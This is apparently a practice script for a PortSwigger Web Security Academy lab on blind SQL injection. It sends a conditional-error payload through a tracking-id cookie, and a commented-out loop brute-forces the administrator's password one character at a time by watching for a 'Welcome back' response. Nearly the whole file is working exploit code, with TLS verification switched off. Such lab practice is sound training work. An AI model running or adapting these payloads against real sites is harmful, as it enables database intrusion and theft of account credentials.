import requests
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a4a00ad04b79da3809b3aca001c0089.web-security-academy.net/filter?category=Gifts"
url = "https://0a7f004d04047a7783238201009600fd.web-security-academy.net/filter?category=Pets"

charset_0 = (
    '0123456789' +
    'abcdefghijklmnopqrstuvwxyz' 
)

# result = ""

payload = "5A6oB9D1S60TjX37' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END) = 'a"

cookies = {
    'TrakingId' : payload,
    'session' : 'K1Tf132VYWry5aXU5OclKsDe3tNx83Gk'
}

res = requests.get(url, cookies=cookies, verify=False)

if (res.status_code != 500 and "Internal Server Error" not in res.text) :
    print(res.text)
else :
    print("Internal Server Error")
    
# for i in range(26):
#     for value in charset_0:
#         payload = f"NZcqkoH3aH19zJxm' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{value}"
#         cookies = {
#             'TrackingId': payload,
#             'session': 'qcBXxl3MUlkR9fFCZaFJ44ZZnyMoDTP1'
#         }
#         res = requests.get(url, cookies=cookies, verify=False)
#         r = res.text
#         if "Welcome back" in r:
#             result += value
#             break
#         else:
#             pass

# print(result)
